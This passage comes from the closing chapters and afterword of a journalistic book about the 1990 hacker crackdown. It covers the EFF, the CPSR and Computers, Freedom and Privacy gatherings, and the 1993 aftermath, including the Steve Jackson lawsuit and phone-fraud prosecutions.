play by a different set of rules.  We're evolving those rules now!  Hopefully you can have a much more decentralized system, and one in which there's more competition in the marketplace.     The role of government will be to make sure that nobody cheats.  The proverbial 'level playing field.'  A policy that prevents monopolization.  It should result in better service, lower prices, more choices, and local empowerment.   He smiles.  I'm very big on local empowerment.     Kapor is a man with a vision.  It's a very novel vision which he and his allies are working out in considerable detail and with great energy.  Dark, cynical, morbid cyberpunk that I am, I cannot avoid considering some of the darker implications of  decentralized, nonhierarchical, locally empowered  networking.    I remark that some pundits have suggested that electronic networking  faxes, phones, small scale photocopiers  played a strong role in dissolving the power of centralized communism and causing the collapse of the Warsaw Pact.    Socialism is totally discredited, says Kapor, fresh back from the Eastern Bloc.  The idea that faxes did it, all by themselves, is rather wishful thinking.    Has it occurred to him that electronic networking might corrode America's industrial and political infrastructure to the point where the whole thing becomes untenable, unworkable  and the old order just collapses headlong, like in Eastern Europe      No,  Kapor says flatly.   I think that's extraordinarily unlikely.  In part, because ten or fifteen years ago, I had similar hopes about personal computers  which utterly failed to materialize.  He grins wryly, then his eyes narrow.   I'm VERY opposed to techno utopias.  Every time I see one, I either run away, or try to kill it.     It dawns on me then that Mitch Kapor is not trying to make the world safe for democracy.  He certainly is not trying to make it safe for anarchists or utopians  least of all for computer intruders or electronic rip off artists.  What he really hopes to do is make the world safe for future Mitch Kapors.  This world of decentralized, small scale nodes, with instant global access for the best and brightest, would be a perfect milieu for the shoestring attic capitalism that made Mitch Kapor what he is today.    Kapor is a very bright man.  He has a rare combination of visionary intensity with a strong practical streak.  The Board of the EFF   John Barlow, Jerry Berman of the ACLU, Stewart Brand, John Gilmore, Steve Wozniak, and Esther Dyson, the doyenne of East West computer entrepreneurism  share his gift, his vision, and his formidable networking talents.  They are people of the 1960s, winnowed out by its turbulence and rewarded with wealth and influence.  They are some of the best and the brightest that the electronic community has to offer.  But can they do it, in the real world   Or are they only dreaming   They are so few. And there is so much against them.    I leave Kapor and his networking employees struggling cheerfully with the promising intricacies of their newly installed Macintosh System 7 software.  The next day is Saturday. EFF is closed.  I pay a few visits to points of interest downtown.    One of them is the birthplace of the telephone.    It's marked by a bronze plaque in a plinth of black and  white speckled granite.  It sits in the plaza of the John F. Kennedy Federal Building, the very place where Kapor was once fingerprinted by the FBI.    The plaque has a bas relief picture of Bell's original telephone.   BIRTHPLACE OF THE TELEPHONE,  it reads.   Here, on June 2, 1875, Alexander Graham Bell and Thomas A. Watson first transmitted sound over wires.     This successful experiment was completed in a fifth floor garret at what was then 109 Court Street and marked the beginning of world wide telephone service.     109 Court Street is long gone.  Within sight of Bell's plaque, across a street, is one of the central offices of NYNEX, the local Bell RBOC, on 6 Bowdoin Square.    I cross the street and circle the telco building, slowly, hands in my jacket pockets.  It's a bright, windy, New England autumn day.  The central office is a handsome 1940s era megalith in late Art Deco, eight stories high.    Parked outside the back is a power generation truck.  The generator strikes me as rather anomalous.  Don't they already have their own generators in this eight story monster   Then the suspicion strikes me that NYNEX must have heard of the September 17 AT T power outage which crashed New York City.  Belt and  suspenders, this generator.  Very telco.    Over the glass doors of the front entrance is a handsome bronze bas relief of Art Deco vines, sunflowers, and birds, entwining the Bell logo and the legend NEW ENGLAND TELEPHONE AND TELEGRAPH COMPANY  an entity which no longer officially exists.    The doors are locked securely.  I peer through the shadowed glass.  Inside is an official poster reading                   New England Telephone a NYNEX Company                              ATTENTION     All persons while on New England Telephone Company premises are required to visibly wear their identification cards  C.C.P. Section 2, Page 1 .     Visitors, vendors, contractors, and all others are required to visibly wear a daily pass.     Thank you.            Kevin C. Stanton,           Building Security Coordinator.       Outside, around the corner, is a pull down ribbed metal security door, a locked delivery entrance.  Some passing stranger has grafitti tagged this door, with a single word in red spray  painted cursive                                 FURY         My book on the Hacker Crackdown is almost over now.  I have deliberately saved the best for last.    In February 1991, I attended the CPSR Public Policy Roundtable, in Washington, DC.  CPSR, Computer Professionals for Social Responsibility, was a sister organization of EFF, or perhaps its aunt, being older and perhaps somewhat wiser in the ways of the world of politics.    Computer Professionals for Social Responsibility began in 1981 in Palo Alto, as an informal discussion group of Californian computer scientists and technicians, united by nothing more than an electronic mailing list.  This typical high tech ad hocracy received the dignity of its own acronym in 1982, and was formally incorporated in 1983.    CPSR lobbied government and public alike with an educational outreach effort, sternly warning against any foolish and unthinking trust in complex computer systems.  CPSR insisted that mere computers should never be considered a magic panacea for humanity's social, ethical or political problems.  CPSR members were especially troubled about the stability, safety, and dependability of military computer systems, and very especially troubled by those systems controlling nuclear arsenals.  CPSR was best known for its persistent and well publicized attacks on the scientific credibility of the Strategic Defense Initiative   Star Wars  .    In 1990, CPSR was the nation's veteran cyber political activist group, with over two thousand members in twenty one local chapters across the US.  It was especially active in Boston, Silicon Valley, and Washington DC, where its Washington office sponsored the Public Policy Roundtable.    The Roundtable, however, had been funded by EFF, which had passed CPSR an extensive grant for operations.  This was the first large scale, official meeting of what was to become the electronic civil libertarian community.    Sixty people attended, myself included  in this instance, not so much as a journalist as a cyberpunk author.  Many of the luminaries of the field took part   Kapor and Godwin as a matter of course.  Richard Civille and Marc Rotenberg of CPSR.  Jerry Berman of the ACLU.  John Quarterman, author of THE MATRIX. Steven Levy, author of HACKERS.  George Perry and Sandy Weiss of Prodigy Services, there to network about the civil liberties troubles their young commercial network was experiencing.  Dr. Dorothy Denning.  Cliff Figallo, manager of the Well.  Steve Jackson was there, having finally found his ideal target audience, and so was Craig Neidorf,  Knight Lightning  himself, with his attorney, Sheldon Zenner.  Katie Hafner, science journalist, and co author of CYBERPUNK   OUTLAWS AND HACKERS ON THE COMPUTER FRONTIER.  Dave Farber, ARPAnet pioneer and fabled Internet guru.  Janlori Goldman of the ACLU's Project on Privacy and Technology.  John Nagle of Autodesk and the Well.  Don Goldberg of the House Judiciary Committee.  Tom Guidoboni, the defense attorney in the Internet Worm case.  Lance Hoffman, computer science professor at The George Washington University. Eli Noam of Columbia.  And a host of others no less distinguished.    Senator Patrick Leahy delivered the keynote address, expressing his determination to keep ahead of the curve on the issue of electronic free speech.  The address was well received, and the sense of excitement was palpable.  Every panel discussion was interesting  some were entirely compelling.  People networked with an almost frantic interest.    I myself had a most interesting and cordial lunch discussion with Noel and Jeanne Gayler, Admiral Gayler being a former director of the National Security Agency.  As this was the first known encounter between an actual no kidding cyberpunk and a chief executive of America's largest and best financed electronic espionage apparat, there was naturally a bit of eyebrow raising on both sides.    Unfortunately, our discussion was off the record.  In fact all the discussions at the CPSR were officially off the  record, the idea being to do some serious networking in an atmosphere of complete frankness, rather than to stage a media circus.    In any case, CPSR Roundtable, though interesting and intensely valuable, was as nothing compared to the truly mind  boggling event that transpired a mere month later.        Computers, Freedom and Privacy.   Four hundred people from every conceivable corner of America's electronic community. As a science fiction writer, I have been to some weird gigs in my day, but this thing is truly BEYOND THE PALE.  Even  Cyberthon,  Point Foundation's  Woodstock of Cyberspace  where Bay Area psychedelia collided headlong with the emergent world of computerized virtual reality, was like a Kiwanis Club gig compared to this astonishing do.    The  electronic community  had reached an apogee.  Almost every principal in this book is in attendance.  Civil Libertarians.  Computer Cops.  The Digital Underground.  Even a few discreet telco people.  Colorcoded dots for lapel tags are distributed.  Free Expression issues.  Law Enforcement.  Computer Security.  Privacy.  Journalists.  Lawyers.  Educators. Librarians.  Programmers.  Stylish punk black dots for the hackers and phone phreaks.  Almost everyone here seems to wear eight or nine dots, to have six or seven professional hats.    It is a community.  Something like Lebanon perhaps, but a digital nation. People who had feuded all year in the national press, people who entertained the deepest suspicions of one another's motives and ethics, are now in each others' laps.  Computers, Freedom and Privacy  had every reason in the world to turn ugly, and yet except for small irruptions of puzzling nonsense from the convention's token lunatic, a surprising bonhomie reigned.  CFP was like a wedding party in which two lovers, unstable bride and charlatan groom, tie the knot in a clearly disastrous matrimony.    It is clear to both families  even to neighbors and random guests  that this is not a workable relationship, and yet the young couple's desperate attraction can brook no further delay.  They simply cannot help themselves.  Crockery will fly, shrieks from their newlywed home will wake the city block, divorce waits in the wings like a vulture over the Kalahari, and yet this is a wedding, and there is going to be a child from it. Tragedies end in death  comedies in marriage.  The Hacker Crackdown is ending in marriage.  And there will be a child.    From the beginning, anomalies reign.  John Perry Barlow, cyberspace ranger, is here.  His color photo in THE NEW YORK TIMES MAGAZINE, Barlow scowling in a grim Wyoming snowscape, with long black coat, dark hat, a Macintosh SE30 propped on a fencepost and an awesome frontier rifle tucked under one arm, will be the single most striking visual image of the Hacker Crackdown.  And he is CFP's guest of honor  along with Gail Thackeray of the FCIC!  What on earth do they expect these dual guests to do with each other   Waltz     Barlow delivers the first address.  Uncharacteristically, he is hoarse  the sheer volume of roadwork has worn him down.  He speaks briefly, congenially, in a plea for conciliation, and takes his leave to a storm of applause.    Then Gail Thackeray takes the stage.  She's visibly nervous.  She's been on the Well a lot lately.  Reading those Barlow posts.  Following Barlow is a challenge to anyone.  In honor of the famous lyricist for the Grateful Dead, she announces reedily, she is going to read  A POEM.  A poem she has composed herself.    It's an awful poem, doggerel in the rollicking meter of Robert W. Service's THE CREMATION OF SAM MCGEE, but it is in fact, a poem.  It's the BALLAD OF THE ELECTRONIC FRONTIER!  A poem about the Hacker Crackdown and the sheer unlikelihood of CFP.  It's full of in jokes.  The score or so cops in the audience, who are sitting together in a nervous claque, are absolutely cracking up.  Gail's poem is the funniest goddamn thing they've ever heard.  The hackers and civil libs, who had this woman figured for Ilsa She Wolf of the SS, are staring with their jaws hanging loosely.  Never in the wildest reaches of their imagination had they figured Gail Thackeray was capable of such a totally off the wall move.  You can see them punching their mental CONTROL RESET buttons.  Jesus!  This woman's a hacker weirdo!  She's JUST LIKE US!  God, this changes everything!    Al Bayse, computer technician for the FBI, had been the only cop at the CPSR Roundtable, dragged there with his arm bent by Dorothy Denning.  He was guarded and tightlipped at CPSR Roundtable  a  lion thrown to the Christians.     At CFP, backed by a claque of cops, Bayse suddenly waxes eloquent and even droll, describing the FBI's  NCIC 2000 , a gigantic digital catalog of criminal records, as if he has suddenly become some weird hybrid of George Orwell and George Gobel.  Tentatively, he makes an arcane joke about statistical analysis.  At least a third of the crowd laughs aloud.     They didn't laugh at that at my last speech,  Bayse observes.  He had been addressing cops  STRAIGHT cops, not computer people.  It had been a worthy meeting, useful one supposes, but nothing like THIS.  There has never been ANYTHING like this.  Without any prodding, without any preparation, people in the audience simply begin to ask questions.  Longhairs, freaky people, mathematicians.  Bayse is answering, politely, frankly, fully, like a man walking on air.  The ballroom's atmosphere crackles with surreality.  A female lawyer behind me breaks into a sweat and a hot waft of surprisingly potent and musky perfume flows off her pulse points.    People are giddy with laughter.  People are interested, fascinated, their eyes so wide and dark that they seem eroticized.  Unlikely daisy chains form in the halls, around the bar, on the escalators   cops with hackers, civil rights with FBI, Secret Service with phone phreaks.    Gail Thackeray is at her crispest in a white wool sweater with a tiny Secret Service logo.   I found Phiber Optik at the payphones, and when he saw my sweater, he turned into a PILLAR OF SALT!  she chortles.    Phiber discusses his case at much length with his arresting officer, Don Delaney of the New York State Police. After an hour's chat, the two of them look ready to begin singing  Auld Lang Syne.   Phiber finally finds the courage to get his worst complaint off his chest.  It isn't so much the arrest.  It was the CHARGE.  Pirating service off 900 numbers.  I'm a PROGRAMMER, Phiber insists.  This lame charge is going to hurt my reputation.  It would have been cool to be busted for something happening, like Section 1030 computer intrusion.  Maybe some kind of crime that's scarcely been invented yet.  Not lousy phone fraud.  Phooey.    Delaney seems regretful.  He had a mountain of possible criminal charges against Phiber Optik.  The kid's gonna plead guilty anyway.  He's a first timer, they always plead.  Coulda charged the kid with most anything, and gotten the same result in the end.  Delaney seems genuinely sorry not to have gratified Phiber in this harmless fashion.  Too late now.  Phiber's pled already.  All water under the bridge.  Whaddya gonna do     Delaney's got a good grasp on the hacker mentality.  He held a press conference after he busted a bunch of Masters of Deception kids.  Some journo had asked him    Would you describe these people as GENIUSES    Delaney's deadpan answer, perfect   No, I would describe these people as DEFENDANTS.   Delaney busts a kid for hacking codes with repeated random dialling.  Tells the press that NYNEX can track this stuff in no time flat nowadays, and a kid has to be STUPID to do something so easy to catch. Dead on again   hackers don't mind being thought of as Genghis Khan by the straights, but if there's anything that really gets 'em where they live, it's being called DUMB.    Won't be as much fun for Phiber next time around.  As a second offender he's gonna see prison.  Hackers break the law. They're not geniuses, either.  They're gonna be defendants.  And yet, Delaney muses over a drink in the hotel bar, he has found it impossible to treat them as common criminals.  Delaney knows criminals.  These kids, by comparison, are clueless  there is just no crook vibe off of them, they don't smell right, they're just not BAD.    Delaney has seen a lot of action.  He did Vietnam.  He's been shot at, he has shot people.  He's a homicide cop from New York.  He has the appearance of a man who has not only seen the shit hit the fan but has seen it splattered across whole city blocks and left to ferment for years.  This guy has been around.    He listens to Steve Jackson tell his story.  The dreamy game strategist has been dealt a bad hand.  He has played it for all he is worth.  Under his nerdish SF fan exterior is a core of iron.  Friends of his say Steve Jackson believes in the rules, believes in fair play.  He will never compromise his principles, never give up.   Steve,  Delaney says to Steve Jackson,  they had some balls, whoever busted you.  You're all right!   Jackson, stunned, falls silent and actually blushes with pleasure.    Neidorf has grown up a lot in the past year.  The kid is a quick study, you gotta give him that.  Dressed by his mom, the fashion manager for a national clothing chain, Missouri college techie frat Craig Neidorf out dappers everyone at this gig but the toniest East Coast lawyers.  The iron jaws of prison clanged shut without him and now law school beckons for Neidorf.  He looks like a larval Congressman.    Not a  hacker,  our Mr. Neidorf.  He's not interested in computer science.  Why should he be   He's not interested in writing C code the rest of his life, and besides, he's seen where the chips fall.  To the world of computer science he and PHRACK were just a curiosity.  But to the world of law....  The kid has learned where the bodies are buried.  He carries his notebook of press clippings wherever he goes.    Phiber Optik makes fun of Neidorf for a Midwestern geek, for believing that  Acid Phreak  does acid and listens to acid rock.  Hell no.  Acid's never done ACID!  Acid's into ACID HOUSE MUSIC.  Jesus.  The very idea of doing LSD.  Our PARENTS did LSD, ya clown.    Thackeray suddenly turns upon Craig Neidorf the full lighthouse glare of her attention and begins a determined half  hour attempt to WIN THE BOY OVER.  The Joan of Arc of Computer Crime is GIVING CAREER ADVICE TO KNIGHT LIGHTNING!   Your experience would be very valuable  a real asset,  she tells him with unmistakeable sixty thousand watt sincerity.  Neidorf is fascinated.  He listens with unfeigned attention.  He's nodding and saying yes ma'am.  Yes, Craig, you too can forget all about money and enter the glamorous and horribly underpaid world of PROSECUTING COMPUTER CRIME!  You can put your former friends in prison  ooops....    You cannot go on dueling at modem's length indefinitely. You cannot beat one another senseless with rolled up press  clippings.  Sooner or later you have to come directly to grips. And yet the very act of assembling here has changed the entire situation drastically.  John Quarterman, author of THE MATRIX, explains the Internet at his symposium.  It is the largest news network in the world, it is growing by leaps and bounds, and yet you cannot measure Internet because you cannot stop it in place. It cannot stop, because there is no one anywhere in the world with the authority to stop Internet.  It changes, yes, it grows, it embeds itself across the post industrial, postmodern world and it generates community wherever it touches, and it is doing this all by itself.    Phiber is different.  A very fin de siecle kid, Phiber Optik.  Barlow says he looks like an Edwardian dandy.  He does rather.  Shaven neck, the sides of his skull cropped hip hop close, unruly tangle of black hair on top that looks pomaded, he stays up till four a.m.  and misses all the sessions, then hangs out in payphone booths with his acoustic coupler gutsily CRACKING SYSTEMS RIGHT IN THE MIDST OF THE HEAVIEST LAW ENFORCEMENT DUDES IN THE U.S., or at least PRETENDING to....  Unlike  Frank Drake.  Drake, who wrote Dorothy Denning out of nowhere, and asked for an interview for his cheapo cyberpunk fanzine, and then started grilling her on her ethics.  She was squirmin', too....  Drake, scarecrow tall with his floppy blond mohawk, rotting tennis shoes and black leather jacket lettered ILLUMINATI in red, gives off an unmistakeable air of the bohemian literatus.  Drake is the kind of guy who reads British industrial design magazines and appreciates William Gibson because the quality of the prose is so tasty.  Drake could never touch a phone or a keyboard again, and he'd still have the nose ring and the blurry photocopied fanzines and the sampled industrial music.  He's a radical punk with a desktop publishing rig and an Internet address.  Standing next to Drake, the diminutive Phiber looks like he's been physically coagulated out of phone lines.  Born to phreak.    Dorothy Denning approaches Phiber suddenly.  The two of them are about the same height and body build.  Denning's blue eyes flash behind the round window frames of her glasses.   Why did you say I was 'quaint '  she asks Phiber, quaintly.    It's a perfect description but Phiber is nonplussed...  Well, I uh, you know....      I also think you're quaint, Dorothy,  I say, novelist to the rescue, the journo gift of gab...  She is neat and dapper and yet there's an arcane quality to her, something like a Pilgrim Maiden behind leaded glass  if she were six inches high Dorothy Denning would look great inside a china cabinet...  The Cryptographeress....  The Cryptographrix...  whatever... Weirdly, Peter Denning looks just like his wife, you could pick this gentleman out of a thousand guys as the soulmate of Dorothy Denning.  Wearing tailored slacks, a spotless fuzzy varsity sweater, and a neatly knotted academician's tie.... This fineboned, exquisitely polite, utterly civilized and hyperintelligent couple seem to have emerged from some cleaner and finer parallel universe, where humanity exists to do the Brain Teasers column in Scientific American.  Why does this Nice Lady hang out with these unsavory characters     Because the time has come for it, that's why.  Because she's the best there is at what she does.    Donn Parker is here, the Great Bald Eagle of Computer Crime....  With his bald dome, great height, and enormous Lincoln like hands, the great visionary pioneer of the field plows through the lesser mortals like an icebreaker....  His eyes are fixed on the future with the rigidity of a bronze statue.... Eventually, he tells his audience, all business crime will be computer crime, because businesses will do everything through computers.   Computer crime  as a category will vanish.    In the meantime, passing fads will flourish and fail and evaporate....  Parker's commanding, resonant voice is sphinxlike, everything is viewed from some eldritch valley of deep historical abstraction...  Yes, they've come and they've gone, these passing flaps in the world of digital computation....  The radio  frequency emanation scandal... KGB and MI5 and CIA do it every day, it's easy, but nobody else ever has....  The salami slice fraud, mostly mythical...   Crimoids,  he calls them.... Computer viruses are the current crimoid champ, a lot less dangerous than most people let on, but the novelty is fading and there's a crimoid vacuum at the moment, the press is visibly hungering for something more outrageous....  The Great Man shares with us a few speculations on the coming crimoids....  Desktop Forgery!  Wow....  Computers stolen just for the sake of the information within them  data napping!  Happened in Britain a while ago, could be the coming thing....  Phantom nodes in the Internet!    Parker handles his overhead projector sheets with an ecclesiastical air...  He wears a grey double breasted suit, a light blue shirt, and a very quiet tie of understated maroon and blue paisley...  Aphorisms emerge from him with slow, leaden emphasis...  There is no such thing as an adequately secure computer when one faces a sufficiently powerful adversary.... Deterrence is the most socially useful aspect of security... People are the primary weakness in all information systems... The entire baseline of computer security must be shifted upward....  Don't ever violate your security by publicly describing your security measures...    People in the audience are beginning to squirm, and yet there is something about the elemental purity of this guy's philosophy that compels uneasy respect....  Parker sounds like the only sane guy left in the lifeboat, sometimes.  The guy who can prove rigorously, from deep moral principles, that Harvey there, the one with the broken leg and the checkered past, is the one who has to be, err.... that is, Mr. Harvey is best placed to make the necessary sacrifice for the security and indeed the very survival of the rest of this lifeboat's crew....  Computer security, Parker informs us mournfully, is a nasty topic, and we wish we didn't have to have it...  The security expert, armed with method and logic, must think  imagine  everything that the adversary might do before the adversary might actually do it.  It is as if the criminal's dark brain were an extensive subprogram within the shining cranium of Donn Parker.  He is a Holmes whose Moriarty does not quite yet exist and so must be perfectly simulated.    CFP is a stellar gathering, with the giddiness of a wedding.  It is a happy time, a happy ending, they know their world is changing forever tonight, and they're proud to have been there to see it happen, to talk, to think, to help.    And yet as night falls, a certain elegiac quality manifests itself, as the crowd gathers beneath the chandeliers with their wineglasses and dessert plates.  Something is ending here, gone forever, and it takes a while to pinpoint it.    It is the End of the Amateurs.      Afterword   The Hacker Crackdown Three Years Later    Three years in cyberspace is like thirty years anyplace real.  It feels as if a generation has passed since I wrote this book.  In terms of the generations of computing machinery involved, that's pretty much the case.    The basic shape of cyberspace has changed drastically since 1990.  A new U.S. Administration is in power whose personnel are, if anything, only too aware of the nature and potential of electronic networks.  It's now clear to all players concerned that the status quo is dead and gone in American media and telecommunications, and almost any territory on the electronic frontier is up for grabs.  Interactive multimedia, cable phone alliances, the Information Superhighway, fiber to  the curb, laptops and palmtops, the explosive growth of cellular and the Internet  the earth trembles visibly.    The year 1990 was not a pleasant one for AT T.  By 1993, however, AT T had successfully devoured the computer company NCR in an unfriendly takeover, finally giving the pole climbers a major piece of the digital action.  AT T managed to rid itself of ownership of the troublesome UNIX operating system, selling it to Novell, a netware company, which was itself preparing for a savage market dust up with operating system titan Microsoft. Furthermore, AT T acquired McCaw Cellular in a gigantic merger, giving AT T a potential wireless whip hand over its former progeny, the RBOCs.  The RBOCs themselves were now AT T's clearest potential rivals, as the Chinese firewalls between regulated monopoly and frenzied digital entrepreneurism began to melt and collapse headlong.    AT T, mocked by industry analysts in 1990, was reaping awestruck praise by commentators in 1993.  AT T had managed to avoid any more major software crashes in its switching stations. AT T's newfound reputation as  the nimble giant  was all the sweeter, since AT T's traditional rival giant in the world of multinational computing, IBM, was almost prostrate by 1993. IBM's vision of the commercial computer network of the future,  Prodigy,  had managed to spend  900 million without a whole heck of a lot to show for it, while AT T, by contrast, was boldly speculating on the possibilities of personal communicators and hedging its bets with investments in handwritten interfaces.  In 1990 AT T had looked bad  but in 1993 AT T looked like the future.    At least, AT T's ADVERTISING looked like the future. Similar public attention was riveted on the massive  22 billion megamerger between RBOC Bell Atlantic and cable TV giant Tele  Communications Inc.  Nynex was buying into cable company Viacom International.  BellSouth was buying stock in Prime Management, Southwestern Bell acquiring a cable company in Washington DC, and so forth.  By stark contrast, the Internet, a noncommercial entity which officially did not even exist, had no advertising budget at all.  And yet, almost below the level of governmental and corporate awareness, the Internet was stealthily devouring everything in its path, growing at a rate that defied comprehension.  Kids who might have been eager computer intruders a mere five years earlier were now surfing the Internet, where their natural urge to explore led them into cyberspace landscapes of such mindboggling vastness that the very idea of hacking passwords seemed rather a waste of time.    By 1993, there had not been a solid, knock 'em down, panic striking, teenage hacker computer intrusion scandal in many long months.  There had, of course, been some striking and well  publicized acts of illicit computer access, but they had been committed by adult white collar industry insiders in clear pursuit of personal or commercial advantage.  The kids, by contrast, all seemed to be on IRC, Internet Relay Chat.    Or, perhaps, frolicking out in the endless glass roots network of personal bulletin board systems.  In 1993, there were an estimated 60,000 boards in America  the population of boards had fully doubled since Operation Sundevil in 1990.  The hobby was transmuting fitfully into a genuine industry.  The board community were no longer obscure hobbyists  many were still hobbyists and proud of it, but board sysops and advanced board users had become a far more cohesive and politically aware community, no longer allowing themselves to be obscure.    The specter of cyberspace in the late 1980s, of outwitted authorities trembling in fear before teenage hacker whiz kids, seemed downright antiquated by 1993.  Law enforcement emphasis had changed, and the favorite electronic villain of 1993 was not the vandal child, but the victimizer of children, the digital child pornographer.   Operation Longarm,  a child pornography computer raid carried out by the previously little known cyberspace rangers of the U.S. Customs Service, was almost the size of Operation Sundevil, but received very little notice by comparison.    The huge and well organized  Operation Disconnect,  an FBI strike against telephone rip off con artists, was actually larger than Sundevil.   Operation Disconnect  had its brief moment in the sun of publicity, and then vanished utterly.  It was unfortunate that a law enforcement affair as apparently well  conducted as Operation Disconnect, which pursued telecom adult career criminals a hundred times more morally repugnant than teenage hackers, should have received so little attention and fanfare, especially compared to the abortive Sundevil and the basically disastrous efforts of the Chicago Computer Fraud and Abuse Task Force.  But the life of an electronic policeman is seldom easy.    If any law enforcement event truly deserved full scale press coverage  while somehow managing to escape it , it was the amazing saga of New York State Police Senior Investigator Don Delaney Versus the Orchard Street Finger Hackers.  This story probably represents the real future of professional telecommunications crime in America.  The finger hackers sold, and still sell, stolen long distance phone service to a captive clientele of illegal aliens in New York City.  This clientele is desperate to call home, yet as a group, illegal aliens have few legal means of obtaining standard phone service, since their very presence in the United States is against the law.  The finger  hackers of Orchard Street were very unusual  hackers,  with an astonishing lack of any kind of genuine technological knowledge. And yet these New York call sell thieves showed a street level ingenuity appalling in its single minded sense of larceny.    There was no dissident hacker rhetoric about freedom of  information among the finger hackers.  Most of them came out of the cocaine dealing fraternity, and they retailed stolen calls with the same street crime techniques of lookouts and bagholders that a crack gang would employ.  This was down and dirty, urban, ethnic, organized crime, carried out by crime families every day, for cash on the barrelhead, in the harsh world of the streets. The finger hackers dominated certain payphones in certain strikingly unsavory neighborhoods.  They provided a service no one else would give to a clientele with little to lose.    With such a vast supply of electronic crime at hand, Don Delaney rocketed from a background in homicide to teaching telecom crime at FLETC in less than three years.  Few can rival Delaney's hands on, street level experience in phone fraud. Anyone in 1993 who still believes telecommunications crime to be something rare and arcane should have a few words with Mr Delaney.  Don Delaney has also written two fine essays, on telecom fraud and computer crime, in Joseph Grau's CRIMINAL AND CIVIL INVESTIGATIONS HANDBOOK  McGraw Hill 1993 .    PHRACK was still publishing in 1993, now under the able editorship of Erik Bloodaxe.  Bloodaxe made a determined attempt to get law enforcement and corporate security to pay real money for their electronic copies of PHRACK, but, as usual, these stalwart defenders of intellectual property preferred to pirate the magazine.  Bloodaxe has still not gotten back any of his property from the seizure raids of March 1, 1990.  Neither has the Mentor, who is still the managing editor of Steve Jackson Games.    Nor has Robert Izenberg, who has suspended his court struggle to get his machinery back.  Mr. Izenberg has calculated that his  20,000 of equipment seized in 1990 is, in 1993, worth  4,000 at most.  The missing software, also gone out his door, was long ago replaced.  He might, he says, sue for the sake of principle, but he feels that the people who seized his machinery have already been discredited, and won't be doing any more seizures.  And even if his machinery were returned  and in good repair, which is doubtful  it will be essentially worthless by 1995.  Robert Izenberg no longer works for IBM, but has a job programming for a major telecommunications company in Austin.    Steve Jackson won his case against the Secret Service on March 12, 1993, just over three years after the federal raid on his enterprise.  Thanks to the delaying tactics available through the legal doctrine of  qualified immunity,  Jackson was tactically forced to drop his suit against the individuals William Cook, Tim Foley, Barbara Golden and Henry Kluepfel.  Cook, Foley, Golden and Kluepfel did, however, testify during the trial.     The Secret Service fought vigorously in the case, battling Jackson's lawyers right down the line, on the  mostly previously untried  legal turf of the Electronic Communications Privacy Act and the Privacy Protection Act of 1980.  The Secret Service denied they were legally or morally responsible for seizing the work of a publisher.  They claimed that  1  Jackson's gaming  books  weren't real books anyhow, and  2  the Secret Service didn't realize SJG Inc was a  publisher  when they raided his offices, and  3  the books only vanished by accident because they merely happened to be inside the computers the agents were appropriating.    The Secret Service also denied any wrongdoing in reading and erasing all the supposedly  private  e mail inside Jackson's seized board, Illuminati.  The USSS attorneys claimed the seizure did not violate the Electronic Communications Privacy Act, because they weren't actually  intercepting  electronic mail that was moving on a wire, but only electronic mail that was quietly sitting on a disk inside Jackson's computer.  They also claimed that USSS agents hadn't read any of the private mail on Illuminati  and anyway, even supposing that they had, they were allowed to do that by the subpoena.    The Jackson case became even more peculiar when the Secret Service attorneys went so far as to allege that the federal raid against the gaming company had actually IMPROVED JACKSON'S BUSINESS thanks to the ensuing nationwide publicity.    It was a long and rather involved trial.  The judge seemed most perturbed, not by the arcane matters of electronic law, but by the fact that the Secret Service could have avoided almost all the consequent trouble simply by giving Jackson his computers back in short order.  The Secret Service easily could have looked at everything in Jackson's computers, recorded everything, and given the machinery back, and there would have been no major scandal or federal court suit.  On the contrary, everybody simply would have had a good laugh.  Unfortunately, it appeared that this idea had never entered the heads of the Chicago based investigators.  They seemed to have concluded unilaterally, and without due course of law, that the world would be better off if Steve Jackson didn't have computers.  Golden and Foley claimed that they had both never even heard of the Privacy Protection Act.  Cook had heard of the Act, but he'd decided on his own that the Privacy Protection Act had nothing to do with Steve Jackson.    The Jackson case was also a very politicized trial, both sides deliberately angling for a long term legal precedent that would stake out big claims for their interests in cyberspace. Jackson and his EFF advisors tried hard to establish that the least e mail remark of the lonely electronic pamphleteer deserves the same somber civil rights protection as that afforded THE NEW YORK TIMES.  By stark contrast, the Secret Service's attorneys argued boldly that the contents of an electronic bulletin board have no more expectation of privacy than a heap of postcards.  In the final analysis, very little was firmly nailed down. Formally, the legal rulings in the Jackson case apply only in the federal Western District of Texas.  It was, however, established that these were real civil liberties issues that powerful people were prepared to go to the courthouse over  the seizure of bulletin board systems, though it still goes on, can be a perilous act for the seizer.  The Secret Service owes Steve Jackson  50,000 in damages, and a thousand dollars each to three of Jackson's angry and offended board users.  And Steve Jackson, rather than owning the single line bulletin board system  Illuminati  seized in 1990, now rejoices in possession of a huge privately owned Internet node,  io.com,  with dozens of phone  lines on its own T 1 trunk.    Jackson has made the entire blow by blow narrative of his case available electronically, for interested parties.  And yet, the Jackson case may still not be over  a Secret Service appeal seems likely and the EFF is also gravely dissatisfied with the ruling on electronic interception.    The WELL, home of the American electronic civil libertarian movement, added two thousand more users and dropped its aging Sequent computer in favor of a snappy new Sun Sparcstation.  Search and seizure dicussions on the WELL are now taking a decided back seat to the current hot topic in digital civil liberties, unbreakable public key encryption for private citizens.    The Electronic Frontier Foundation left its modest home in Boston to move inside the Washington Beltway of the Clinton Administration.  Its new executive director, ECPA pioneer and longtime ACLU activist Jerry Berman, gained a reputation of a man adept as dining with tigers, as the EFF devoted its attention to networking at the highest levels of the computer and telecommunications industry.  EFF's pro encryption lobby and anti wiretapping initiative were especially impressive, successfully assembling a herd of highly variegated industry camels under the same EFF tent, in open and powerful opposition to the electronic ambitions of the FBI and the NSA.    EFF had transmuted at light speed from an insurrection to an institution.  EFF Co Founder Mitch Kapor once again sidestepped the bureaucratic consequences of his own success, by remaining in Boston and adapting the role of EFF guru and gray eminence.  John Perry Barlow, for his part, left Wyoming, quit the Republican Party, and moved to New York City, accompanied by his swarm of cellular phones.  Mike Godwin left Boston for Washington as EFF's official legal adviser to the electronically afflicted.    After the Neidorf trial, Dorothy Denning further proved her firm scholastic independence of mind by speaking up boldly on the usefulness and social value of federal wiretapping.  Many civil libertarians, who regarded the practice of wiretapping with deep occult horror, were crestfallen to the point of comedy when nationally known  hacker sympathizer  Dorothy Denning sternly defended police and public interests in official eavesdropping. However, no amount of public uproar seemed to swerve the  quaint  Dr. Denning in the slightest.  She not only made up her own mind, she made it up in public and then stuck to her guns.    In 1993, the stalwarts of the Masters of Deception, Phiber Optik, Acid Phreak and Scorpion, finally fell afoul of the machineries of legal prosecution.  Acid Phreak and Scorpion were sent to prison for six months, six months of home detention, 750 hours of community 